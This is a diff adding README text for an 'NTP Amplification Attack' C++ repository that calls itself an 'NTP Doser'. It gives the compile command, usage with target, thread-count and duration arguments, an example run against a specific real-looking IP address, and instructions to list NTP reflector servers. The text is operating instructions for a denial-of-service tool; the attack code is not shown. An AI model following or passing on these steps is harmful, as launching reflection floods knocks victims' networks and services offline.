@@ -1,2 +1,15 @@
 # NTP-Amplification-Attack-demonstration-C-
 NTP Amplification Attack demonstration C++
+
+NTP Amplification attack Demonstration using C++
+Compiling.
+===
+    gcc NTPAttack.cpp -o NTPAttack -lstdc++ -lpthread
+Running NTP Doser.
+===
+	sudo ./NTPAttack [target] [threads] [time]
+
+	example: $ sudo ./NTPAttack 132.163.97.1 3 10
+ntp.list :
+===
+Add some ntp server ip addresses in the ntp.list file
